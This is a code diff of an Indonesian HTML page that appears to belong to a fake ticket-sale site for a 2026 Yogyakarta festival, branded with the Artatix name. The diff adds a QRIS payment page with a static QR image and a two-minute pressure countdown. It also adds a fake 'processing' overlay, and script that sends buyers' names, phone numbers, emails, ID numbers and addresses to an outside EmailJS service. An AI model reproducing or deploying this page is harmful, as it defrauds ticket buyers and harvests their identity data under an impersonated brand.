@@ -2,133 +2,145 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Final_tiket</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Final QRIS Payment</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
-body{background:#f3f4f6;padding:20px 20px 140px}
-.banner{max-width:900px;margin:0 auto 25px;overflow:hidden;border-radius:24px}.banner img{width:100%;display:block;border-radius:24px}.wrap{max-width:900px;margin:auto}
-h1{font-size:42px;margin:10px 0 25px}
-.card{background:#fff;border:1px solid #ddd;border-radius:28px;overflow:hidden;margin-bottom:28px;position:relative}
-.card:before,.card:after{content:"";position:absolute;width:38px;height:38px;border-radius:50%;background:#f3f4f6;top:72%;transform:translateY(-50%)}
-.card:before{left:-19px}.card:after{right:-19px}
-.content{padding:35px}
-.top{display:flex;justify-content:space-between;gap:10px}
-.name{font-size:22px;font-weight:700}
-.badge{background:#dcfce7;color:#15803d;padding:10px 15px;border-radius:10px;font-weight:700}
-.info{margin-top:25px;font-size:15px;line-height:2;font-style:italic}
-.limit{display:inline-block;margin-top:20px;background:#eef2ff;color:#4361ee;padding:10px 15px;border-radius:10px;font-weight:700}
-.hr{margin-top:25px;border-top:2px dashed #ddd}
-.bottom{padding:25px 35px;display:flex;justify-content:space-between;align-items:center}
-.price{font-size:28px;font-weight:800}
-.qty{display:flex;align-items:center;gap:12px}
-.btn{width:42px;height:42px;border:none;border-radius:10px;background:#4361ee;color:#fff;font-size:24px}
-.num{min-width:35px;text-align:center;font-size:22px;font-weight:700}
-.footer{text-align:center;padding:60px 20px}
-.logo{font-size:48px;font-weight:800;color:#2934b6}
-.contact{margin-top:15px;font-size:20px}
-.copy{margin-top:25px;padding-top:20px;border-top:1px solid #ddd;color:#666}
-.checkout{position:fixed;left:0;right:0;bottom:0;background:#fff;padding:18px;box-shadow:0 -4px 20px rgba(0,0,0,.08)}
-.bar{max-width:900px;margin:auto}
-.row{display:flex;justify-content:space-between;font-size:20px;font-weight:700;margin-bottom:12px}
-.buy{width:100%;height:58px;border:none;border-radius:14px;background:#8ea2f5;color:#fff;font-size:22px;font-weight:700}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
+body{background:linear-gradient(135deg,#081225,#101b35);color:#fff;padding:20px}
+.wrap{max-width:800px;margin:auto}
+.card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);backdrop-filter:blur(16px);border-radius:28px;padding:24px;margin-top:20px}
+.timer{font-size:44px;font-weight:800;text-align:center;color:#00e5ff}
+.timer.warning{color:#ff3b3b;animation:pulse .8s infinite}
+@keyframes pulse{50%{transform:scale(1.08)}}
+.alert{display:none;text-align:center;color:#ff6b6b;font-weight:700;margin-top:8px}
+.alert.show{display:block;animation:pulse .8s infinite}
+.info{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:20px 0}
+.item{background:rgba(255,255,255,.05);padding:14px;border-radius:16px}
+.label{font-size:12px;color:#b8c4d8}
+.value{font-weight:700;margin-top:6px}
+.qrbox{text-align:center;padding:18px;border-radius:24px;background:#fff}
+.qrbox img{max-width:100%;border-radius:16px}
+.total{font-size:34px;font-weight:800;color:#00e5ff;text-align:center;margin:15px 0}
+.copybtn,.btn{width:100%;padding:16px;border:none;border-radius:16px;font-weight:700;cursor:pointer}
+.copybtn{background:#243b63;color:#fff;margin-bottom:15px}
+.uploadbox{border:2px dashed rgba(255,255,255,.3);padding:30px;border-radius:22px;text-align:center;background:rgba(255,255,255,.04)}
+.uploadbox input{display:none}
+.uploadbox label{cursor:pointer;display:block}
+.preview{max-width:100%;display:none;border-radius:16px;margin-top:15px}
+.btn{background:linear-gradient(135deg,#00c8ff,#0099ff);color:#fff;margin-top:15px}
+#overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);justify-content:center;align-items:center;flex-direction:column;z-index:9999}
+.spin{width:80px;height:80px;border-radius:50%;border:6px solid rgba(255,255,255,.15);border-top:6px solid #00e5ff;animation:rot 1s linear infinite}
+@keyframes rot{100%{transform:rotate(360deg)}}
+#status{margin-top:20px}
 </style>
 </head>
 <body>
-<div class="banner"><img src="banner.png" alt="Banner Event"></div>
 <div class="wrap">
-<h1>🎟️ Kategori Tiket</h1>
-
 <div class="card">
-<div class="content">
-<div class="top">
-<div class="name">Early Bird – Bolo Area (VIP)</div>
-<div class="badge">ON SALE</div>
-</div>
+<div class="timer" id="payTimer">02:00</div>
+<div class="alert" id="warn">⚠ SEGERA SELESAIKAN PEMBAYARAN</div>
+
 <div class="info">
-- Maksimal pembelian 5 tiket dalam 1 kali transaksi<br><br>
-- Tiket di semua kategori merupakan tiket berdiri<br><br>
-- Ibu hamil tidak disarankan memasuki area venue Jomlo Festival 2026 #Yogyakarta<br><br>
-- Tiket tidak bisa dipindahtangankan dengan alasan apapun<br><br>
-- Promotor tidak bertanggung jawab atas pembelian tiket di luar partner resmi Artatix
+<div class="item"><div class="label">Nama Pemesan</div><div class="value" id="nama">-</div></div>
+<div class="item"><div class="label">Jumlah Tiket</div><div class="value" id="jumlah">0</div></div>
+<div class="item"><div class="label">Jenis Tiket</div><div class="value" id="jenis">-</div></div>
+<div class="item"><div class="label">Total Pembayaran</div><div class="value" id="totalInfo">Rp0</div></div>
 </div>
-<div class="limit">⏰ Limited Time</div>
-<div class="hr"></div>
+
+<div class="qrbox">
+<img src="qris-pembayaran1.jpg" alt="QRIS">
 </div>
-<div class="bottom">
-<div class="price">Rp100.000</div>
-<div class="qty">
-<button class="btn" onclick="chg('vip',-1)">-</button>
-<div id="vip" class="num">0</div>
-<button class="btn" onclick="chg('vip',1)">+</button>
+
+<div class="total" id="total">Rp0</div>
+<button class="copybtn" onclick="copyNominal()">📋 Salin Nominal Pembayaran</button>
+
+<div class="uploadbox">
+<label for="bukti">📤 Upload Bukti Pembayaran<br><small>Klik untuk memilih gambar</small></label>
+<input type="file" id="bukti" accept="image/*">
+<img id="preview" class="preview">
 </div>
+
+<div style="margin-top:15px">
+<label><input type="checkbox" id="agree"> Saya telah melakukan pembayaran</label>
+</div>
+
+<button class="btn" onclick="verifikasi()">KONFIRMASI PEMBAYARAN</button>
 </div>
 </div>
 
-<div class="card">
-<div class="content">
-<div class="top">
-<div class="name">Early Bird – Jomlo Area (Festival)</div>
-<div class="badge">ON SALE</div>
-</div>
-<div class="info">
-- Maksimal pembelian 5 tiket dalam 1 kali transaksi<br><br>
-- Tiket di semua kategori merupakan tiket berdiri<br><br>
-- Ibu hamil tidak disarankan memasuki area venue Jomlo Festival 2026 #Yogyakarta<br><br>
-- Tiket tidak bisa dipindahtangankan dengan alasan apapun<br><br>
-- Promotor tidak bertanggung jawab atas pembelian tiket di luar partner resmi Artatix
-</div>
-<div class="limit">⏰ Limited Time</div>
-<div class="hr"></div>
-</div>
-<div class="bottom">
-<div class="price">Rp75.000</div>
-<div class="qty">
-<button class="btn" onclick="chg('fest',-1)">-</button>
-<div id="fest" class="num">0</div>
-<button class="btn" onclick="chg('fest',1)">+</button>
-</div>
-</div>
+<div id="overlay">
+<div class="spin"></div>
+<div id="status">Pembayaran Sedang Diproses...</div>
 </div>
 
-<div class="footer">
-<div class="logo">Artatix</div>
-<div class="contact">+62 821-3767-6220</div>
-<div class="contact">cs@artatix.co.id</div>
-<div class="copy">© 2026 Artatix. Hak Cipta Dilindungi.</div>
-</div>
-</div>
-
-<div class="checkout">
-<div class="bar">
-<div class="row">
-<span>Harga Mulai dari</span>
-<span id="total">Rp0</span>
-</div>
-<button class="buy" onclick="beli()">Beli Sekarang</button>
-</div>
-</div>
-
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-let vip=0,fest=0;
-const VP=100000,FP=75000;
-function chg(id,v){
- if(id==='vip'){vip=Math.max(0,vip+v);document.getElementById('vip').innerText=vip;}
- else{fest=Math.max(0,fest+v);document.getElementById('fest').innerText=fest;}
- const t=vip*VP+fest*FP;
- document.getElementById('total').innerText='Rp'+t.toLocaleString('id-ID');
+emailjs.init({publicKey:"qwh-PQ-0-G6lBjI4C"});
+
+const nama=localStorage.getItem('nama')||'-';
+const jenis=localStorage.getItem('jenisTiket')||'-';
+const jumlah=localStorage.getItem('jumlahTiket')||'0';
+const total=localStorage.getItem('totalPembayaran')||'0';
+
+document.getElementById('nama').innerText=nama;
+document.getElementById('jenis').innerText=jenis;
+document.getElementById('jumlah').innerText=jumlah;
+document.getElementById('total').innerText='Rp'+Number(total).toLocaleString('id-ID');
+document.getElementById('totalInfo').innerText='Rp'+Number(total).toLocaleString('id-ID');
+
+let t=120;
+const timer=document.getElementById('payTimer');
+setInterval(()=>{
+ if(t>0){
+  t--;
+  let m=Math.floor(t/60),s=t%60;
+  timer.innerText=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+  if(t<=10){
+    timer.classList.add('warning');
+    document.getElementById('warn').classList.add('show');
+  }
+ }
+},1000);
+
+document.getElementById('bukti').onchange=e=>{
+ const f=e.target.files[0];
+ if(!f)return;
+ preview.src=URL.createObjectURL(f);
+ preview.style.display='block';
 }
-function beli(){
- const total=vip*VP+fest*FP;
- const jumlahTiket=vip+fest;
- if(jumlahTiket<1){alert('Pilih tiket terlebih dahulu');return;}
- let arr=[];
- if(vip>0) arr.push('Early Bird - Bolo Area (VIP) x'+vip);
- if(fest>0) arr.push('Early Bird - Jomlo Area (Festival) x'+fest);
- localStorage.setItem('jenisTiket',arr.join(', '));
- localStorage.setItem('jumlahTiket',jumlahTiket);
- localStorage.setItem('totalPembayaran',total);
- window.location.href='form.html';
+
+function copyNominal(){
+ navigator.clipboard.writeText(total);
+ alert('Nominal berhasil disalin');
+}
+
+function verifikasi(){
+ if(!agree.checked){alert('Centang konfirmasi pembayaran');return;}
+ if(!bukti.files.length){alert('Upload bukti pembayaran');return;}
+
+ overlay.style.display='flex';
+
+ const dataEmail={
+  nama:nama,
+  email:localStorage.getItem('email')||'',
+  wa:localStorage.getItem('wa')||'',
+  identitas:localStorage.getItem('identitas')||'',
+  nomorIdentitas:localStorage.getItem('nomorIdentitas')||'',
+  alamat:localStorage.getItem('alamat')||'',
+  jenis_tiket:jenis,
+  jumlah_tiket:jumlah,
+  totalPembayaran:total,
+  metode_pembayaran:'QRIS',
+  tanggal_transaksi:new Date().toLocaleString('id-ID')
+ };
+
+ emailjs.send('service_9nf9rsp','template_6wlex0w',dataEmail);
+ emailjs.send('service_9nf9rsp','template_egdxxaj',dataEmail);
+
+ setTimeout(()=>{
+   window.location.href='pending.html';
+ },5000);
 }
 </script>
 </body>
